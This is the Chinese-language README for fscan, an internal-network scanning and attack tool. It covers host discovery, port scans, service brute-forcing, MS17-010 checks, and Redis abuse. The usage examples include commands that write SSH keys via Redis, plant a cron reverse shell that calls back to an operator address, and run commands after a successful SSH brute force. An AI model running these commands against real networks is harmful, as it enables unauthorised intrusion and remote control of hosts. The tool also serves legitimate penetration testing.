# fscan

# 简介
一款内网扫描工具，方便一键大保健。  
支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。  
趁着最近有空，用go把f-scrack重构了一遍。使用go来编写，也有更好的扩展性及兼容性。  
还在逐步增加功能，欢迎各位师傅提意见。


## why
为什么有LadonGo、x-crack 、tscan、Gscan 这些工具了还要写fscan  

答：  
   因为用习惯了f-scrack，习惯一条命令跑完所有模块，省去一个个模块单独调用的时间，当然我附加了-m 指定模块的功能。


## usege
简单用法
``` 
go run main.go -h 192.168.1.1/24
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写私钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
```
```
-h 192.168.1.1/24 (C段)  
-h 192.168.1.1/16 (B段)
-h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
```


完整参数
```
  -c string
        exec command (ssh)
  -h string
        IP address of the host you want to scan,for example: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -m string
        Select scan type ,as: -m ssh (default "all")
  -no
        not to save output log
  -np
        not to ping
  -o string
        Outputfile (default "result.txt")
  -p string
        Select a port,for example: 22 | 1-65535 | 22,80,3306 (default "21,22,23,80,135,443,445,1433,1521,3306,5432,6379,7001,8080,8089,9000,9200,11211,27017")
  -pwd string
        password
  -pwdf string
        password file
  -rf string
        redis file to write sshkey file (as: -rf id_rsa.pub)
  -rs string
        redis shell to write cron file (as: -rs 192.168.1.1:6666)
  -t int
        Thread nums (default 100)
  -time int
        Set timeout (default 3)
  -user string
        username
  -userf string
        username file
```

## 运行截图

`fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写私钥)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)`
![](image/3.png)

## 未来计划
[*] 增加内网常见高危漏洞  
[*] 增加高危web漏洞扫描  
[*] 师傅们觉得有必要加的漏洞，也可以提issue  


## 参考链接
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   